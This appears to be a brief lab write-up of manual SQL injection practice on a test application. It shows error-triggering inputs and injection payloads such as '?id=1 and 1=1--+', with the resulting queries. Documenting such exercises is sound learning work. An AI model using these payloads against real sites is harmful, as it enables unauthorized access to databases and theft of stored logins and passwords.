REFERENCES- https://gbhackers.com/perform-manual-sql-injection/
Initially we are trying to first trigger an error in the application
I tried using a string and  a double digit number but these did not cause anything

used: ?id=1-


 
<img width="928" alt="life" src="https://user-images.githubusercontent.com/76178081/104938346-f8615800-59d4-11eb-9d25-6abbdb7ed419.PNG">



We can see in the error that extra " and 'quotes are present which means that the variable is enclosed in them and whatever input we provide will be enclosed in them.



Payload used: ?id=1 -- (--  is used to comment out the input)

<img width="933" alt="greta" src="https://user-images.githubusercontent.com/76178081/104937748-298d5880-59d4-11eb-9f3d-4ee3ce432d52.PNG">

SELECT Login,Password FROM TableName WHERE id=1--;






The payload used is ?id=1 and 1=1--+ 


<img width="954" alt="sqli9" src="https://user-images.githubusercontent.com/76178081/104888773-38075000-5993-11eb-8340-73fd66e319cd.PNG">

SQL QUERY for this would be

SELECT Login , Your Password FROM <TableName> WHERE id==1 and 1=1--+;
